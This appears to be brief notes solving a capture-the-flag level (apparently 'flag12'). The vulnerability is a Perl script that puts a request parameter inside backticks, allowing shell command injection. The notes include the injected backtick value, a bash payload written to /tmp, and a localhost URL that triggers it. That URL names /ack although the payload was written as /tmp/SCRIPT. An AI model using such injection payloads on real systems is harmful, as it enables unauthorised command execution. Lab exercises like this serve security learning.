Pretty sure we need to exploit line 11 or 14
"@output = `egrep "^$xx" /tmp/xd 2>&1`;"
This line can be made to execute a payload
"@output = `egrep "^`/*/SCRIPT`" /tmp/xd 2>&1`;"
by making $xx=`/*/SCRIPT`
`echo '#!/bin/bash
getflag > /tmp/flag' > /tmp/SCRIPT && chmod 777 /tmp/SCRIPT`
This creates a payload file to be executed by flag12
This executes the payload:
"http://localhost:4646/?x=`/*/ack`"
